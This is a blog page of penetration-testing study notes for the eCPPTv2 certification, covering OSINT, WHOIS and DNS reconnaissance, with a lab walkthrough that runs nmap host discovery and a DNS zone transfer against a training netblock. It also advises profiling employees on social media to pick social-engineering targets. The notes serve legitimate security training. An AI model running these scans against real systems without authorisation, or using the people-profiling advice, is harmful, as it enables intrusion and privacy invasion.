<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>2 - Network Security |</title>
<meta name="description" content="Scans, Information Gathering, Vulnerabilities and more ">


  <meta name="author" content="Nullified">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="">
<meta property="og:title" content="2 - Network Security">
<meta property="og:url" content="http://localhost:4000/notes/ecppt/networksecurity/">


  <meta property="og:description" content="Scans, Information Gathering, Vulnerabilities and more ">



  <meta property="og:image" content="http://localhost:4000/assets/images/main/header3.jpg">





  <meta property="article:published_time" content="2023-11-20T00:00:00+06:00">





  

  


<link rel="canonical" href="http://localhost:4000/notes/ecppt/networksecurity/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "john",
      "url": "http://localhost:4000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single single">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
        
        <a class="site-title" href="/">
          
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/">Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/menu">Menu</a>
            </li><li class="masthead__menu-item">
              <a href="/about">About</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
  
    

    <div class="initial-content">
      
  







<div class="page__hero--overlay"
  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header3.jpg');"
>
  
    <div class="wrapper">
      <h1 id="page-title" class="page__title" itemprop="headline">
        
          2 - Network Security

        
      </h1>
      
        <p class="page__lead">eCPPTv2
</p>
      
      
        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  121 minute read

</p>
      
      
      
    </div>
  
  
</div>





<div id="main" role="main">
  
  <div class="sidebar sticky">
  
  
    
      
      
      
      
    
    
      

<nav class="nav__list">
  
  <input id="ac-toc" name="accordion-toc" type="checkbox" />
  <label for="ac-toc">Toggle menu</label>
  <ul class="nav__items">
    
      <li>
        
          <span class="nav__sub-title">Posts</span>
        

        
        <ul>
          
            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
          
            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
          
            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
          
            <li><a href="">────────────────</a></li>
          
        </ul>
        
      </li>
    
      <li>
        
          <span class="nav__sub-title">Notes</span>
        

        
        <ul>
          
            <li><a href="/notes/ejpt/">eJPT</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/ecppt/">eCPPTv2</a></li>
          
            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
          
            <li><a href="/notes/ecppt/networksecurity/" class="active">- Network Security</a></li>
          
            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
          
            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
          
            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
          
            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
          
            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/pnpt/">PNPT</a></li>
          
            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
          
            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
          
            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
          
            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
          
            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
          
            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/eewptx/">eWPTXv2</a></li>
          
            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
          
            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
          
            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
          
            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
          
            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
          
            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
          
            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
          
            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
          
            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
          
            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
          
            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
          
            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
          
            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
          
            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
          
            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="">Active Directory Exploitation</a></li>
          
            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
          
            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
          
            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
          
            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/crtp/">CRTP</a></li>
          
            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
          
            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
          
            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
          
            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
          
            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
          
            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
          
            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/crte/">CRTE</a></li>
          
            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
          
            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
          
            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
          
            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
          
            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
          
        </ul>
        
      </li>
    
      <li>
        
          <span class="nav__sub-title">My CVEs</span>
        

        
        <ul>
          
            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
          
            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
          
        </ul>
        
      </li>
    
  </ul>
</nav>

    
  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="2 - Network Security">
    <meta itemprop="description" content="eCPPTv2">
    <meta itemprop="datePublished" content="2023-11-20T00:00:00+06:00">
    

    <div class="page__inner-wrap">
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#information-gathering">Information Gathering</a>
    <ul>
      <li><a href="#can-be-passive-or-active">Can be Passive or Active</a></li>
      <li><a href="#mind-mapping-technology">Mind mapping technology</a></li>
      <li><a href="#keep-track-of-networksvulns-scans">keep track of networks/vulns scans</a></li>
      <li><a href="#search-engine">Search Engine</a></li>
      <li><a href="#lab-2">Lab 2</a></li>
      <li><a href="#social-media">Social Media</a></li>
      <li><a href="#infrastructures">Infrastructures</a></li>
      <li><a href="#tools">Tools</a></li>
    </ul>
  </li>
  <li><a href="#scanning">Scanning</a>
    <ul>
      <li><a href="#overview">Overview</a></li>
      <li><a href="#wireshark">Wireshark</a></li>
      <li><a href="#hping-basics">HPING Basics</a></li>
      <li><a href="#nmap-network-mapper">NMAP (Network Mapper)</a></li>
      <li><a href="#stealth-mode---idle-scan-theory">Stealth mode - IDLE SCAN THEORY</a></li>
      <li><a href="#nmap-nse-nmap-script-language">Nmap NSE (Nmap Script Language)</a></li>
      <li><a href="#extra-scanning-tools">Extra scanning tools</a></li>
      <li><a href="#service-and-os-detection">Service and OS Detection</a></li>
      <li><a href="#firewall--ids-evasion">Firewall / IDS Evasion</a></li>
    </ul>
  </li>
  <li><a href="#enumeration">Enumeration</a>
    <ul>
      <li><a href="#netbios">NetBIOS</a></li>
      <li><a href="#smb---server-message-block">SMB - Server Message Block</a></li>
      <li><a href="#snmp">SNMP</a></li>
      <li><a href="#lab-netbios">Lab NetBios</a></li>
      <li><a href="#lab-snmp">Lab SNMP</a></li>
    </ul>
  </li>
  <li><a href="#sniffing--mitm-attacks">Sniffing &amp; MitM Attacks</a>
    <ul>
      <li><a href="#overview-1">Overview</a></li>
      <li><a href="#arp-concepts">ARP Concepts</a></li>
    </ul>
  </li>
  <li><a href="#arp-protocol">Arp Protocol</a>
    <ul>
      <li><a href="#2-main-ways-to-arp-poisoning">2 main ways to ARP poisoning</a></li>
      <li><a href="#sniffing-tools">Sniffing Tools</a></li>
      <li><a href="#attacking-tools">Attacking Tools</a></li>
      <li><a href="#intercepting-ssl-traffic">Intercepting SSL traffic</a></li>
      <li><a href="#lab-cainabel">Lab Cain&amp;Abel</a></li>
      <li><a href="#lab-poison">Lab Poison</a></li>
      <li><a href="#lab-nbt-ns">Lab NBT-NS</a></li>
    </ul>
  </li>
  <li><a href="#lab-icmp">Lab ICMP</a></li>
  <li><a href="#exploitation">Exploitation</a>
    <ul>
      <li><a href="#vulnerability-assessment">Vulnerability Assessment</a></li>
      <li><a href="#low-hanging-fruits--lhf-">Low Hanging Fruits ( LHF )</a></li>
      <li><a href="#exploitation-1">Exploitation</a></li>
      <li><a href="#lab-va">Lab VA</a></li>
      <li><a href="#lab-nessus">Lab Nessus</a></li>
    </ul>
  </li>
  <li><a href="#service-postgresql-start">service postgresql start</a></li>
  <li><a href="#msfdb-init">msfdb init</a>
    <ul>
      <li><a href="#lab-client-side">Lab Client Side</a></li>
      <li><a href="#lab-dns--smb-relay">LAB DNS &amp; SMB Relay</a></li>
    </ul>
  </li>
  <li><a href="#post-exploitation">Post Exploitation</a>
    <ul>
      <li><a href="#privilege-escalation-and-maintaining-access">Privilege Escalation and Maintaining Access</a></li>
      <li><a href="#data-harvesting-aka-pillaging">Data Harvesting (aka Pillaging)</a></li>
      <li><a href="#mapping-the-internal-network">Mapping the Internal Network</a></li>
      <li><a href="#exploitation-through-pivoting">Exploitation through Pivoting</a></li>
      <li><a href="#regular-payload">Regular Payload</a></li>
      <li><a href="#labs">Labs</a></li>
    </ul>
  </li>
  <li><a href="#anonymity">Anonymity</a>
    <ul>
      <li><a href="#browsing-anonymously">Browsing Anonymously</a></li>
      <li><a href="#tunneling-for-anonymity">Tunneling for Anonymity</a></li>
    </ul>
  </li>
  <li><a href="#social-engineering">Social Engineering</a>
    <ul>
      <li><a href="#types-of-social-engineering">Types of Social Engineering</a></li>
      <li><a href="#samples-of-social-engineering-attacks">Samples of Social Engineering Attacks</a></li>
      <li><a href="#tools-3">Tools</a></li>
      <li><a href="#social-engineering-linux-targets">Social Engineering Linux Targets</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<h1 id="information-gathering">Information Gathering</h1>

<p>Business:
	deals with collecting information regarding the type of business, its stakeholders, assets, products, services, employees and generally non-technical information;</p>

<p>Insfrastructure:
	networks, systems, domains, IP addresses, etc</p>

<h2 id="can-be-passive-or-active">Can be Passive or Active</h2>

<p>Passive or OSINT:
	web presence, partners, financial info, physical plants, infrastructure related information etc
	get information without exposing our presence.
	using publicly available resources (accessible by anyone)</p>

<p>Active:
	gather information about ports, services, running systems, net blocks etc
	active techniques can reveal the investigation to the organization through IDS or server logs so caution should be taken to prevent this.</p>

<h2 id="mind-mapping-technology">Mind mapping technology</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FreeMind = http://freemind.sourceforge.net/wiki/index.php/Main_Page
Xmind = https://www.xmind.net/
</code></pre></div></div>

<h2 id="keep-track-of-networksvulns-scans">keep track of networks/vulns scans</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dradis = http://dradisframework.org/
Faraday = https://github.com/infobyte/faraday
Magitree = http://www.gremwell.com/what_is_magictree
</code></pre></div></div>

<h2 id="search-engine">Search Engine</h2>

<h3 id="web-presence">Web Presence</h3>

<ul>
  <li>What they do</li>
  <li>what is their business purpose</li>
  <li>physical and logical locations</li>
  <li>employees and departments</li>
  <li>email and contact information</li>
  <li>alternative web sites and sub-domains</li>
  <li>
    <p>press releases, new, comments, opinions</p>
  </li>
  <li>start with the company name
company website
analyze information that is publicly available</li>
</ul>

<h3 id="google-dorks">Google Dorks</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.exploit-db.com/google-hacking-database/
http://pdf.textfiles.com/security/googlehackers.pdf
http://www.googleguide.com/advanced_operators_reference.html
</code></pre></div></div>

<h3 id="organization-that-operate-globally">Organization that operate globally</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	DUNS number (duns and bradstreet)
	cage code (or ncage \for a non us business)
	https://www.sam.gov/
	http://www.sec.gov/edgar.shtml
</code></pre></div></div>

<ul>
  <li>Partners: through the partners you can gather information such as the technology stack the organization uses (hardware and software), tools, systems etc</li>
</ul>

<h3 id="job-postings">Job Postings</h3>
<p>Through career opportunities, you can gather information such as internal hierarchies, vacancies, projects, responsabilities, weak departments, financed projects, technology implementations and more.</p>

<p>List of websites that you can use to find job posts:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	http://www.linkedin.com/
	http://www.indeed.com/
	http://www.monster.com/
	http://www.careerbuilder.com/
	http://www.glassdoor.com/
	http://www.simplyhired.com/
	http://www.dice.com/
</code></pre></div></div>

<h3 id="financial-information">Financial Information</h3>
<p>you can find out if the organization:
	is going to invest in a specific technology
	might be subject to a possible merge with another organization
	has critical assets and business services
http://www.crunchbase.com/
crunchbase is a databse where you can find information about:
	Companies
	People
	Investors and financial information</p>

<p>http://www.inc.com/</p>

<h3 id="documents-and-files">Documents and Files</h3>
<p>such as:
	charts (detailing the corporate structure), database files, diagrams, papers, documentation, spredsheet etc
then:
	harvest emails, accounts (twitter, facebook etc), names, roles, etc
extract useful information in the metadata of the file</p>

<p>in google:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	site:[website] and filetype:[filetype]
</code></pre></div></div>

<p>Harvest files with tools:
FOCA: [windows based]
	https://www.elevenpaths.com/labstools/foca/index.html
TheHarvester:
	https://github.com/laramies/theHarvester
	theharvester -d [domain] -l [limits of results] -b google/bing/linkedin</p>

<h3 id="cached-and-archival-sites">Cached and archival sites</h3>
<p>waybackmachine
	http://www.archive.org/index.php</p>

<p>in google</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	cache:URL
</code></pre></div></div>

<h2 id="lab-2">Lab 2</h2>
<p><em>Target organization: University Campus.</em></p>

<p>Scope: The scope is limited to the following domain and netblock:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Netblock: 10.50.96.0/23

    Domain: foocampus.com
-  Task 1 : host discovery
	fping -a -g 10.50.96.0/23 2&gt;/dev/null &gt; hosts-up 
	nmap -sn 10.50.96.0/23
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.50.96.5
10.50.96.15
10.50.97.6
10.50.97.5
10.50.97.15
</code></pre></div></div>

<ul>
  <li>Task 2 : Host discovery no ping
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//nmap -p 80,443,53,22 10.50.96,97.5.15.6 -T4
nmap -n -sn -PS22,135,443,445 10.50.96.0/23
 to not generate to much traffic, we will use argument -PS
 with this scan we discovered another ip
 10.50.97.17 &gt; because it was probably blocking pings with firewall
</code></pre></div>    </div>
  </li>
  <li>
    <p>Task 3 : difference
the second scan discovered a new host in the network, because it probably has firewall that is blocking pings</p>
  </li>
  <li>Task 4 : dns
both have the port 53 open, so I assume its dns
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sS -sU -p53 10.50.96.0/23
10.50.96.5
10.50.96.15
</code></pre></div>    </div>
  </li>
  <li>task 5 : name server
we found 2 dns ips before, so we will focus on them</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1) &gt;&gt;nslookup
2) &gt;&gt;server 10.50.96.5
3) &gt;&gt;set q=NS
4) &gt;&gt;foocampus.com
</code></pre></div></div>

<p>printsection()</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>foocampus.com   nameserver = ns1.foocampus.com
foocampus.com   nameserver = ns.foocampus.com

&gt; server 10.50.96.5
Default server: 10.50.96.5
Address: 10.50.96.5#53
&gt; ns.foocampus.com
Server:         10.50.96.5
Address:        10.50.96.5#53
</code></pre></div></div>

<h3 id="discovering-new-ips-with-nslookup">discovering new ips with nslookup</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Name:   ns.foocampus.com
Address: 10.50.96.21
------------------------------------------
Name:   ns1.foocampus.com
Address: 10.50.96.22
</code></pre></div></div>

<ul>
  <li>task 6 - MX Record</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt; nslookup
&gt;&gt; server 10.50.96.5
&gt;&gt; set q=MX
&gt;&gt; foocampus.com

printsection()
foocampus.com   mail exchanger = 10 pop3.foocampus.com.
</code></pre></div></div>

<ul>
  <li>task 7 : zone transfer</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
	dig @10.50.96.5 foocampus.com <span class="nt">-t</span> AXFR +nocookie
	host <span class="nt">-t</span> axfr foocampus.com 10.50.96.5

<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.17.19-1-Debian &lt;&lt;<span class="o">&gt;&gt;</span> @10.50.96.5 foocampus.com <span class="nt">-t</span> AXFR +nocookie                                          
<span class="p">;</span> <span class="o">(</span>1 server found<span class="o">)</span>                                                                                                    
<span class="p">;;</span> global options: +cmd                                                                                               
foocampus.com.          3600    IN      SOA     foocampus.com. campusadmin. 47 900 600 86400 3600                     
foocampus.com.          3600    IN      NS      ns.foocampus.com.                                                     
foocampus.com.          3600    IN      NS      ns1.foocampus.com.                                                    
foocampus.com.          3600    IN      MX      10 pop3.foocampus.com.                                                
ftp.foocampus.com.      3600    IN      A       10.50.96.10                                                           
intranet.foocampus.com. 3600    IN      A       10.50.96.15                                                           
management.foocampus.com. 3600  IN      A       10.50.96.15                                                           
ns.foocampus.com.       3600    IN      A       10.50.96.21                                                           
ns1.foocampus.com.      3600    IN      A       10.50.96.22                                                           
pop3.foocampus.com.     3600    IN      A       10.50.96.60                                                           
www.foocampus.com.      3600    IN      A       10.50.96.15                                                           
foocampus.com.          3600    IN      SOA     foocampus.com. campusadmin. 47 900 600 86400 3600                     
<span class="p">;;</span> Query <span class="nb">time</span>: 519 msec                                                                                               
<span class="p">;;</span> SERVER: 10.50.96.5#53<span class="o">(</span>10.50.96.5<span class="o">)</span> <span class="o">(</span>TCP<span class="o">)</span>                                                                            
<span class="p">;;</span> WHEN: Sat Dec 04 10:49:45 <span class="nt">-03</span> 2021                                                                                 
<span class="p">;;</span> XFR size: 12 records <span class="o">(</span>messages 12, bytes 685<span class="o">)</span>

</code></pre></div></div>

<ul>
  <li>task 8 - draw the network map</li>
</ul>

<p>~</p>

<ul>
  <li>task 9 - Report your findings
After scan the network, we discover various IPS addresses from DNS and through that we discover more IPs from ftp, intranet, name server, email server etc.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dig axfr -x 192.168 @192.214.31.3
</code></pre></div></div>

<blockquote>
  <p>to show only reverse dns entries</p>
</blockquote>

<p>network map of lab 2 - 10.50.96.0/23</p>

<h2 id="social-media">Social Media</h2>
<p>with the help of social media, a pentester can gather:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	phone numbers
	addresses
	history
	CV
	opinions
	responsabilities
	project 
	etc
</code></pre></div></div>

<p>social media is useful in the following ways:
	learn about corporate culture, hierarchies, business processes, technologies, applications
	to build a network map of people (relationships)
	select the most appropriate targer For a social engineering attack</p>

<p>On linkedin you can perform  advanced search functions on people based upon:
	current title, position, location, company, etc</p>

<p>when you have limited access because maybe you dont have connection with the person etc:
	upgrade your linkedin account
	use a specific query in a search engine in order to find (if exists) the public linkedin profile of the target</p>

<blockquote>
  <p>Why is building a network of people important?
	social engineering is the art of exploit trust relationships
	you can get to bob through a person he trusts etc</p>
</blockquote>

<h3 id="people-search">people search</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	http://www.pipl.com/
	http://www.spokeo.com/
	http://www.peoplefinders.com/
	http://www.crunchbase.com/
</code></pre></div></div>

<p>At this point we should have gathered:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	age, phone number, business, adresses, occupation, interests
	further we go to: emails, related docs, website owned, financial info
</code></pre></div></div>

<h2 id="infrastructures">Infrastructures</h2>
<p>goal is retrieve data such as:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	domains
	netblocks or ip addresses
	mail servers
	ISP used
	any other technical information
</code></pre></div></div>

<p>The approach depends upon the SOE (Scope of Engagement)
Lets assume the below listed cases:
	case 1 - we have the name of the organization (full scope)
	case 2 - we only have specific net blocks to test</p>

<ul>
  <li>
    <p>case 1
This process aims to collect all the hostnames related to the organization and relative IP addresses
The process ends when we obtain:
  domains, dns servers in use, mail server, ip addresses</p>
  </li>
  <li>
    <p>First step
WHOIS = is a query/response protocol, used For querying an official domain registrer database in order to determine:</p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  the owner of a domain name
  ip address or range
  autonomous system
  technical contacts
  expiration date of the domain
</code></pre></div>    </div>
  </li>
</ul>

<p>The web based whois is there, normally runs on tcp port 43
	https://tools.ietf.org/html/rfc3912</p>

<ul>
  <li>A Regional Internet Registry (RIR)
  organization that manages resources such as IP addresses and Autonomous System For a specific region.
There are five main RIR provides For WhoIs information:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  AFRINIC - africa
  APNIC - asia
  RIPE NCC - europe
  ARIN - north america
  LACNIC - south america
</code></pre></div>    </div>
  </li>
  <li>information obtained from whois:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Number Resource Records
  Network numbers (ip addresses) = NETs
  Autonomous system numbers = ASNs
  Organization records = ORGs
  Point of contact records = POCs
  Authoritative information \for Autonomous system numbers and registered outside of the RIR being queried
</code></pre></div>    </div>
  </li>
</ul>

<h3 id="tools-that-allow-you-to-use-whois">Tools that allow you to use WHOIS:</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	http://who.is/
	http://whois.domaintools.com/
	http://bgp.he.net/
	http://networking.ringofsaturn.com/Tools/whois.php
	http://www.networksolutions.com/whois/index.jsp
	http://www.betterwhois.com/
</code></pre></div></div>

<blockquote>
  <p>What information did we get from WHOIS that can help determine the infrastructure of the organization?
	Name servers!
These are servers that store all the dns related information (records) about the domain</p>
</blockquote>

<ul>
  <li>DNS = Domain Name System
  key aspect of information security as it binds a hostname to an IP address and many protocols such as SSL are as safe as the DNS protocol they bind to.
  contains textual records
  each record has a given type, each with a differente role</li>
</ul>

<h3 id="dns-queries">DNS Queries</h3>
<blockquote>
  <p>DNS queries produce listings called Resource Records.</p>
</blockquote>

<ul>
  <li>Resource Record
A Resource record starts with a domain name, usually a fully qualified domain name. If anything other than a fully qualified domain name is used, the name of the zone the record is in will automatically be appended to the end of the name.</li>
  <li>Time-To-Live (TTL)
recorded in seconds, defaults to the minimum value determined in the start of authority (SOA) record</li>
  <li>Record Class
Internet, Hesiod or Chaos</li>
  <li>Start of Authority (SOA)
Indicates the beginning of a zone and it should occur first in a zone file. There can be only one SOA record per zone. Defines certain values For the zone such as a serial number and various expiration timeouts.</li>
  <li>Name Server
Defines an authoritative name server For a zone. Defines and delegates authority to a name server For a childe zone. NS Records are the GLUE that binds the distributed database together,</li>
  <li>Address
The A record simply maps a hostname to an IP address. Zones with A records are called <em>forward</em> zones.</li>
  <li>Pointer
The PTR record maps an IP address to a Hostname. Zones with PTR records are called <em>reverse</em> zones.</li>
  <li>CNAME
The CNAME record maps an alias hostname to an A record hostname</li>
  <li>Mail Exchange (MX)
The MX record specifies a host that will accept email on behalf of a given host.
The specified host has an associated priority value A single host may have multiple MX records. The records For a Specific host make up a prioritized list.</li>
</ul>

<h3 id="dns-lookup">DNS Lookup</h3>
<blockquote>
  <p>DNS lookup asks the DNS to resolve a given hostname to the corresponding IP.</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nslookup &lt;target-organization.com&gt;
</code></pre></div></div>

<p>First u need to discover the IP addresses then try to resolve them.</p>

<h4 id="reverse-dns-lookup">Reverse DNS lookup</h4>
<p>we will receive the IP address associated to a given domain name. This process queries For DNS pointer records (PTR).
command line:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	nslookup -type=PTR &lt;ip address&gt;
</code></pre></div></div>

<p>online tool:
	http://network-tools.com/nslook/</p>

<h4 id="mx-mail-exchange-lookup">MX (Mail Exchange) lookup</h4>
<p>we retrieve a list of servers responsible For delivering emails For that domain.
command line:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	nslookup -type=MX &lt;domain&gt;
</code></pre></div></div>

<p>only tools:
	http://www.dnsqueries.com/en/
	http://www.mxtoolbox.com/</p>

<h4 id="zone-transfers">Zone transfers</h4>
<p>zone transfers are usually a misconfiguration of the remote DNS server. They should be enabled only For trusted IP addresses (usually trusted downtream name servers).
When zone transfers are enabled, we can enumerate the entire DNS record For that zone,
This includes all the sub domains of our domain (A records)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	nslookup -type=NS &lt;domain.com&gt;
</code></pre></div></div>

<p>There are usually two name servers, Take note of both of them.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	nslookup
	server &lt;domain.com&gt;
	ls -d &lt;domain.com&gt;
</code></pre></div></div>

<ul>
  <li>Dig = http://linux.die.net/man/1/dig
